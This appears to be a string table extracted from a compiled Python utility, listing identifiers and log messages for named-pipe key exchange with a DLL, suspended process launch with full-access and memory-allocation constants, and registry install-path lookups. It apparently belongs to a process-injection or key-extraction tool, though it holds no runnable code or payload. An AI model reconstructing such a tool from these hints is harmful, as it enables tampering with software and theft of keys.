+uSend encrypted key to DLL via pipe and receive decrypted key.
+astruct
+apack
+aencrypted_key
+aConnectNamedPipe
+apipe
+aERROR_PIPE_CONNECTED
+uConnectNamedPipe error=
+aresult_holder
+aDWORD
+aWriteFile
+abyref
+uWriteFile error=
+uKey sent
+ubytes=
+avalue
+acreate_string_buffer
+ aReadFile
+ uReadFile error=
+araw
+adecode
+aascii
+astrip
+uKey received
+ulen=
+aCloseHandle
+uClose a named pipe handle.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+actypes
+awintypes
+alogging
+aLoggingManager
+aLogType
+awindll
+aname
+areturn
+asetup_pipe
+Natimeout_ms
+Ostr
+adecrypt_key
+aclose_pipe
+uapp\util\pipe.py
+u<module app.util.pipe>
+apipe
+apipe
+aencrypted_key
+atimeout_ms
+athreading
+aresult_holder
+apipe_operation
+ato_send
+aconnected
+aerror
+abytes_written
+asuccess
+arecv_buf
+abytes_read
+weaencrypted_key
+apipe
+aresult_holder
+aencrypted_key
+apipe
+aresult_holder
+aname
+apipe_name
+apipe
+aerror
+a__spec__
+.app.util.process
+aprocess_id
+aprocess_handle
+aSTARTUPINFO
+asizeof
+aPROCESS_INFORMATION
+akernel32
+aCreateProcessW
+aCREATE_SUSPENDED
+abyref
+aGetLastError
+aLoggingManager
+aadd
+a_MODULE
+uCreateProcess failed
+aLogType
+aERROR
+upath=
+su error=
+aCloseHandle
+ahThread
+uProcess launched
+aDEBUG
+upid=
+adwProcessId
+aSuspendedProcess
+ahProcess
+uLaunch suspended failed
+uLaunch a process in suspended state.
+aTerminateProcess
+uTerminate a process and close the handle.
+arotl32
+upid_to_tag.<locals>.rotl32
+u08X
+uConvert PID to pipe name tag (same algorithm as Java).
+l a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+actypes
+awintypes
+alogging
+aLoggingManager
+aLogType
+aprocess
+|aPROCESS_ALL_ACCESS
+ aMEM_COMMIT
+@aMEM_RESERVE
+aPAGE_READWRITE
+awindll
+aStructure
+a__prepare__
+a__getitem__
+u%s.__prepare__() must return a mapping, not %s
+a__name__
+u<metaclass>
+a__module__
+a__qualname__
+aDWORD
+alpReserved
+aLPWSTR
+alpDesktop
+alpTitle
+adwX
+adwY
+adwXSize
+adwYSize
+adwXCountChars
+adwYCountChars
+adwFillAttribute
+adwFlags
+awShowWindow
+aWORD
+acbReserved2
+alpReserved2
+aPOINTER
+aBYTE
+ahStdInput
+aHANDLE
+ahStdOutput
+ahStdError
+a_fields_
+a__orig_bases__
+adwThreadId
+aLPCWSTR
+aLPVOID
+aBOOL
+aargtypes
+arestype
+aUINT
+a__init__
+uSuspendedProcess.__init__
+aapp_path
+areturn
+alaunch_suspended
+aterminate_process
+apid
+areturn
+Oint
+Ostr
+apid_to_tag
+uapp\util\process.py
+u<module app.util.process>
+a__class__
+aself
+aprocess_id
+aprocess_handle
+aapp_path
+astartup_info
+aprocess_info
+asuccess
+aerror
+apid
+arotl32
+wxwrT
+aprocess_handle
+a__spec__
+.app.util.registry
+aHIVES
+aSUBPATHS
+sw\awinreg
+aOpenKey
+ahive
+a__enter__
+a__exit__
+aQueryValueEx
+aLoggingManager
+aadd
+a_MODULE
+uInstall path found
+aLogType
+aDEBUG
+u -> 
+nnnuRegistry error
+aWARN
+uGet the install path for an application from the registry.
+a__doc__
+a__file__
+aorigin
+ahas_location
+a__cached__
+alogging
+aLoggingManager
+aLogType
+aregistry
+aHKEY_LOCAL_MACHINE
+aHKEY_CURRENT_USER
+uSOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
+uSOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths
+aapplication
+areturn
+Ostr
+Ostr
+aget_install_path
+uapp\util\registry.py
+u<module app.util.registry>
+aapplication
+ahive
+asubpath
+akey_path
+akey
+ainstall_path
+w_wea__spec__
